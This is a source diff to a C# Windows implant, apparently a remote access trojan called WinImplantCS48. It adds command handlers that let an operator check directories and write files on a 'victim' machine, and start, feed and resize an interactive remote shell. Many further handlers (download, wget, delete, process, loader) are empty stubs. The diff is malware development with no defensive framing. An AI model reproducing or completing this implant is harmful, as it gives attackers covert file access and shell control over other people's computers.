@@ -24,6 +24,11 @@ namespace WinImplantCS48
 
         private bool m_bIsConnected = false;
 
+        private clsfnShell m_fnShell { get; set; }
+        
+        //Listener
+        private clsLtnTcp m_ltnTcp { get; set; }
+
         public frmMain(string[] args)
         {
             InitializeComponent();
@@ -143,6 +148,125 @@ namespace WinImplantCS48
                         clsEZData.fnszSend2dParser(ls2d),
                     });
                 }
+                else if (vsMsg[1] == "goto")
+                {
+                    int nCode = Directory.Exists(vsMsg[2]) ? 1 : 0;
+                    victim.fnSendCommand(new string[]
+                    {
+                        "file",
+                        "goto",
+                        nCode.ToString(),
+                        vsMsg[2],
+                    });
+                }
+                else if (vsMsg[1] == "wf")
+                {
+                    string szFilePath = vsMsg[2];
+                    string szContent = vsMsg[3];
+
+                    var ret = fileMgr.fnWriteFile(szFilePath, szContent);
+                    victim.fnSendCommand(new string[]
+                    {
+                        "file",
+                        "wf",
+                        ret.nCode.ToString(),
+                        ret.szContent,
+                    });
+                }
+                else if (vsMsg[1] == "rf")
+                {
+
+                }
+                else if (vsMsg[1] == "uf")
+                {
+
+                }
+                else if (vsMsg[1] == "df")
+                {
+
+                }
+                else if (vsMsg[1] == "wget")
+                {
+
+                }
+                else if (vsMsg[1] == "del")
+                {
+
+                }
+                else if (vsMsg[1] == "cp")
+                {
+
+                }
+                else if (vsMsg[1] == "mv")
+                {
+
+                }
+                else if (vsMsg[1] == "img")
+                {
+
+                }
+                else if (vsMsg[1] == "nd")
+                {
+
+                }
+            }
+            else if (vsMsg[0] == "proc")
+            {
+
+            }
+            else if (vsMsg[0] == "srv")
+            {
+
+            }
+            else if (vsMsg[0] == "shell")
+            {
+                if (vsMsg[1] == "start")
+                {
+                    if (m_fnShell == null)
+                    {
+                        m_fnShell = new clsfnShell(victim);
+                        m_fnShell.fnStart();
+                    }
+                }
+                else if (vsMsg[1] == "stop")
+                {
+                    if (m_fnShell != null)
+                    {
+                        m_fnShell.fnStop();
+                        m_fnShell.Dispose();
+                        m_fnShell = null;
+                    }
+                }
+                else if (vsMsg[1] == "input")
+                {
+                    if (m_fnShell != null)
+                    {
+                        byte[] abData = Convert.FromBase64String(vsMsg[2]);
+                        m_fnShell.fnPushInput(abData);
+                    }
+                }
+                else if (vsMsg[1] == "resize")
+                {
+                    if (m_fnShell != null)
+                    {
+                        int nCol = int.Parse(vsMsg[2]);
+                        int nRow = int.Parse(vsMsg[3]);
+
+                        m_fnShell.fnResize(nCol, nRow);
+                    }
+                }
+                else if (vsMsg[1] == "exec")
+                {
+
+                }
+            }
+            else if (vsMsg[0] == "loader")
+            {
+
+            }
+            else if (vsMsg[0] == "server")
+            {
+
             }
         }
 
